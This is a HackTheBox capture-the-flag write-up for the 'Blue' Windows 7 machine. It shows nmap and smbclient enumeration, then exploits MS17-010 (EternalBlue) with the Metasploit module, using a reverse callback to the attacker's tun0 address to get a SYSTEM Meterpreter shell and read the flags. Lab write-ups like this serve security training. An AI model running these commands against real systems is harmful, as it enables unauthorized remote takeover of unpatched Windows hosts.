# Blue

**Platform:** HackTheBox  
**OS:** Windows 7  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows 7 machine vulnerable to MS17-010 (EternalBlue), a critical 
SMB vulnerability exploited by the NSA and leaked by Shadow Brokers 
in 2017. Exploitation via Metasploit grants direct SYSTEM access.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.40
```

**Open ports:**

| Port | Service |
|------|---------|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |

**Host information:**
- Hostname: haris-PC
- OS: Windows 7

---

## 2. SMB Enumeration

Listed available SMB shares:

```bash
smbclient -L 10.10.10.40
```

Found 5 shares: Admin$, C$, IPC$, Share, Users.

Identified vulnerability **MS17-010 (EternalBlue)** affecting 
SMBv1 on Windows 7.

---

## 3. Exploitation

Exploited MS17-010 using Metasploit:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.40
set LHOST tun0
exploit
```

Received **Meterpreter** session as SYSTEM.

Dropped into shell:

```bash
shell
```

---

## 4. Flags

Navigated to user flag:
cd ..
cd haris/Desktop
type user.txt

Navigated to root flag:
cd ../../Administrator/Desktop
type root.txt

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| smbclient | SMB share enumeration |
| Metasploit | MS17-010 exploitation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| MS17-010 EternalBlue | SMBv1 remote code execution |
